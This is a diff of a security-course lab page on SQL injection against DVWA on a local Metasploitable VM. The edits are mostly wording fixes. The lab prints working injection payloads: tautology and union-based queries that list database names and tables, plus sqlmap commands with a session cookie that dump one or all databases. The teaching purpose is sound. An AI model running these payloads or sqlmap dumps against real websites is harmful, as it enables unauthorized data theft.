@@ -8,17 +8,17 @@ slug: sqli
 ---
 
 
-For this activity, run virt-manager and start your Metasploitable VM. Browse to <http://192.168.56.102/dvwa> from a browser with Kali and log with username `admin` and password `password`.
+For this activity, run virt-manager and start your Metasploitable VM. Browse to <http://192.168.56.102/dvwa> from a browser in the Kali VM and log in with username `admin` and password `password`.
 
-**Important:** On the menu on the left, select "DVWA Security" and change the security level to "low".
+**Important:** On the menu on the left, select "DVWA Security" and change the security level to "low."
 
-Select SQL Injection, and click "View Help" and "View Source" to understand what SQL query is being used.
+Select "SQL Injection," and click "View Help" and "View Source" to understand what SQL query is being used.
 
 ## Try to trigger an error
 
-If you can submit input that will cause the route to crash, then this suggests that the route does not properly handle user input, and that it might be vulnerable to an injection attack.
+If you can submit input that will cause the page to crash, then this suggests that the page does not properly handle user input, and that it might be vulnerable to an injection attack.
 
-Enter a single quote: `'` and press enter. This will show an error. It is possible that the route is running a SQL query that uses a single quote mark.
+Enter a single quote: `'` and press enter. This will show an error. It is possible that the page is running a SQL query that uses a single quote mark.
 
 Try the following SQLi queries.
 
@@ -26,16 +26,16 @@ Try the following SQLi queries.
 
 `test' OR 1=1#`
 
-This query will display all records that are True or False. The `test'` parameter will probably not be equal to any user in the Database and will equal to False. The other part `1=1` will be `True` since `1` (one) is equal to `1` (one). The `#` sign comments out any following SQL code or error. The query that executes in the database looks like this;
+This query will display all records that are True or False. The `test'` parameter will probably not be equal to any user in the database and therefore this statement should evaluate to False. The other part, `1=1`, will be `True` since `1` (one) is equal to `1` (one). The `#` sign comments out any following SQL code or error. The query that executes in the database looks like this;
 
 `SELECT first_name, last_name FROM users WHERE user_id = 'test' or '1'='1';`
 
 ## Union-based SQLi queries
 
-Union clause allows attackers to execute additional Select queries and add results to the original query. It can be used to get data from other tables. However, you need to make sure that:
+A union clause allows attackers to execute additional `select` queries and add results to the original query. It can be used to retrieve data from other tables. However, you need to make sure that:
 
-- Each query return the same amount of columns
-- The data types in each column must be compatible between queries"
+- Each modified query returns the same number of columns as the original query.
+- The data types in each column of the modified query must be compatible those in the original query.
 
 ### Show database version
 
@@ -59,13 +59,13 @@ Union clause allows attackers to execute additional Select queries and add resul
 
 ### Show all users and the database name 
 
-Demonstrates joining a tautology query with a `database() query using the `union` command.
+Demonstrates joining a tautology query with a `database()` query using the `union` command.
 
 `' or 0=0 union select null, database() #`
 
 ### Show just the database name
 
-Again demonstrates joining two queries with the union command. Both commands below are equivalent.
+Again demonstrates joining two queries with the union command. Both commands below are equivalent:
 
 `' or 0=1 union select null, database() #`
 
@@ -73,7 +73,7 @@ Again demonstrates joining two queries with the union command. Both commands bel
 
 ### Show all tables in the database. 
 
-Note: the route's query is designed to return two fields, so we request `null` as the first field in our injection.
+**Note**: the page's query is designed to return two fields, so we request `null` as the first field in our injection.
 
 `' and 1=0 union select null, table_name from information_schema.tables #`
 
@@ -119,7 +119,7 @@ Note: the route's query is designed to return only two fields, so we must concat
 
 ## SQLMap demo
 
-You can automate testing for and exploiting SQL injection vulnerabilities using the open-source python tool [`sqlmap`](https://github.com/sqlmapproject/sqlmap). This tool comes pre-installed in your Kali. 
+You can automate testing for and exploiting SQL injection vulnerabilities using the open-source python tool [`sqlmap`](https://github.com/sqlmapproject/sqlmap). This tool comes pre-installed in Kali. 
 
 ### Provide a valid COOKIE
 
@@ -151,7 +151,7 @@ A correct `COOKIE` usage will look like this:
 
 ### Provide a valid target URL
 
-We need to provide `sqlmap` with a parameterized example URL. In the case of DVWA, the SQL Injection is manifest as a URL GET parameter, in the form of `?id=<value>` in the URL. The easiest way to get a valid injectable URL for `sqlmap` to use against DVWA is to submit *any* query to the SQL Injection page, and then copy-paste the resultant URL. The image below shows the resultant url from submitting a query of `1` on `/dvwa/vulnerabilities/sqli/`:
+We need to provide `sqlmap` with a parameterized example URL. In the case of DVWA, the SQL Injection is manifest as a URL GET parameter, in the form of `?id=<value>` in the URL. The easiest way to get a valid injectable URL for `sqlmap` to use against DVWA is to submit *any* query to the SQL Injection page, and then copy-paste the resultant URL. The image below shows the resultant URL from submitting a query of `1` on `/dvwa/vulnerabilities/sqli/`:
 
 {% include lab-image.html image='dvwa-sqlmap-example-url.png' %}
 
@@ -160,7 +160,7 @@ We see that the URL is `http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Su
 
 ### Probe the URL for vulnerabilities
 
-From your Kali shell with the `export`ed `COOKIE` variable, run the following command. When prompted for input, accept the default options.
+From your Kali shell with the exported `COOKIE` variable, run the following command. When prompted for input, accept the default options.
 
 ```shell
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" 
@@ -171,7 +171,7 @@ sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 ### Dump the current database
 
-Now that `sqlmap` has learned about the `id` argument vulnerability, we can dump the underlying database. The `--dump` flag will dump only the database implicitly used by the vulnerable route -- in this case, that is the `dvwa` database. All tables on that database will be dumped. Dump that database with the following command:
+Now that `sqlmap` has learned about the `id` argument vulnerability, we can dump the underlying database. The `--dump` flag will dump only the database implicitly used by the vulnerable route--in this case, that is the `dvwa` database. All tables on that database will be dumped. Dump that database with the following command:
 
 ```shell
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump
@@ -205,11 +205,11 @@ This shows the following 7 databases:
 [*] tikiwiki195
 ```
 
-We can dump *all* of these using the `--dump-all` flag. **Warning**, this command will take a long time. There are a lot of tables across these databases on the MySQL server on Metasploitable2.
+We can dump *all* of these using the `--dump-all` flag. **Warning**: this command will take a long time. There are a lot of tables across these databases on the MySQL server on Metasploitable2.
 
 
 ```shell
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump-all
 ```
 
-This demonstrates why isolating apps from one another -- why using separate MySQL servers for separate apps, instead of hosting multiple apps on a single server -- can help reduce the blast radius if an app is found to have a vulnerability. A SQL injection in the DVWA application exposed *all* apps hosted on this server.
+This demonstrates why isolating apps from one another--why using separate MySQL servers for separate apps, instead of hosting multiple apps on a single server--can help reduce the blast radius if an app is found to have a vulnerability. A SQL injection in the DVWA application exposed *all* apps hosted on this server.
